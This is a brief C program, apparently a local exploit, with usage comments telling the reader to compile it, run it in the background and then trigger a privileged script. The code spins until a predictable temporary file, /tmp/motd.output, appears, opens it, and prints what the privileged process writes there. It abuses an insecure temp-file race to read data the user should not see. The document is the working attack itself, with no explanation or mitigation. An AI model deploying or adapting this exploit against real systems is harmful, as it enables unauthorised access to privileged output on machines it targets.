#include <stdio.h>
#include <unistd.h>
#include <errno.h>

/* Compile: gcc -o r r.c -static
   Run: $ ./r > out &
   
   Then invoke privileged script 
*/
 
 
int main(int argc, char *argv[]) {
	FILE *f;
	char c;
 
	while(1) {
		f = fopen("/tmp/motd.output", "r");
		if(f != NULL) {
			break;
		}
	}
	
	printf("Got FD, sleeping for a moment.\n");
	
	usleep(1000000);
	
	while((c = getc(f)) != EOF) {
		putchar(c);
	}
 
	fclose(f);
	
	return 0;
}
